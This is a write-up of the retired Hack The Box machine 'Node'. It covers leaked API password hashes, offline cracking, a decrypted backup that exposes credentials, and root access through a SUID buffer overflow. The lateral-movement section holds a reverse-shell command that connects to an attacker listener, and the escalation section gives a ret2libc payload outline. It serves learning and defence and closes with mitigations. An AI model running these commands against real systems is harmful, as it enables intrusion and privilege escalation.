---
machine: Node
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, nodejs, api, excessive-data-exposure, zip2john, mongodb, suid, buffer-overflow]
---

# Node — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

An Express API exposes every user's password hash. The administrator hash is cracked, an encrypted backup is downloaded, and the backup's source code reveals MongoDB and SSH credentials. MongoDB access allows inserting a task that runs commands as another user. The final escalation abuses a 32-bit SUID backup binary with a stack buffer overflow.

## Reconnaissance

```bash
nmap -Pn -sC -sV -p22,3000 <IP>
```

- SSH on 22.
- Node.js/Express application on 3000.
- The site is a social network called MyPlace.

## Enumeration

The client-side JavaScript references several `/api` routes. `/api/users/latest` returns an array with `_id`, `username`, `password` and `is_admin`; it should not include the hash.

```bash
curl -s http://<IP>:3000/api/users/latest | jq .
curl -s http://<IP>:3000/api/users/mark | jq .
```

The SHA-256 hashes are saved and attacked offline with a wordlist.

```bash
hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt
```

The administrator hash yields `<PASSWORD>`. Those credentials open the admin panel and allow downloading `myplace.backup`.

## Foothold

The backup is ASCII text with a single base64 line. Decode it and confirm it is a password-protected ZIP.

```bash
base64 -d myplace.backup > myplace.zip
file myplace.zip
zip2john myplace.zip > backup.hash
john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

The password `<ZIP_PASSWORD>` opens the archive. It contains the application source, including `app.js`, with the MongoDB connection string and the backup key. The password for user `mark` in that configuration also works over SSH.

```bash
ssh mark@<IP>
```

## Lateral movement

MongoDB listens only on localhost. User `mark` can authenticate, and the application executes entries from the `tasks` collection.

```bash
mongo -u mark -p '<PASSWORD>' --authenticationDatabase users
```

```javascript
db.tasks.insert({cmd: "bash -c 'bash -i >& /dev/tcp/<LHOST>/443 0>&1'"})
```

The task runs as `tom`; a shell confirms the context with `id`.

## Privilege escalation

`tom` can run a root-owned SUID binary:

```bash
find / -perm -4000 -type f 2>/dev/null
ls -l /usr/local/bin/backup
```

The binary is 32-bit ELF with no canary and no PIE, and NX enabled. It copies the supplied path into a stack buffer with `strcpy` and invokes `zip` through `system`. An oversized path overflows the buffer.

The intended exploit is a `ret2libc`: find the offset with `pattern_create`, leak or brute-force the libc base past ASLR, and call `system("/bin/sh")`. A command-injection variant in the path is also possible because the string reaches `system`.

```bash
# Offset and addresses are derived from a local copy of the binary.
./backup a '' "$(python3 -c 'print("A"*<OFFSET> + "<RET>")')"
```

The resulting shell is root.

## Evidence

- API response with redacted hashes.
- `file` and `zip2john` output for the backup.
- `id` as `tom` and as root.
- Screenshot of the MongoDB command, without the real task.

## Lessons learned

- An API returning the whole object leaks fields the client does not need.
- Code backups often contain connection secrets and keys.
- A SUID binary using `strcpy` on a controlled path is a buffer overflow, not just a bad practice.

## Mitigations and detection

- Return only required fields and never hashes or secrets.
- Keep backups outside the service's reach and encrypt them with a key that is not embedded.
- Run MongoDB with authentication and least privilege; validate the tasks the application executes.
- Build with canaries, PIE and `FORTIFY_SOURCE`; remove unnecessary SUID binaries.
- Alert on bulk `/api/users` downloads, backup access and task creation in MongoDB.

## References

- <https://www.hackthebox.com/machines/Node>
- <https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/>
- <https://attack.mitre.org/techniques/T1552/001/>
- <https://attack.mitre.org/techniques/T1068/>
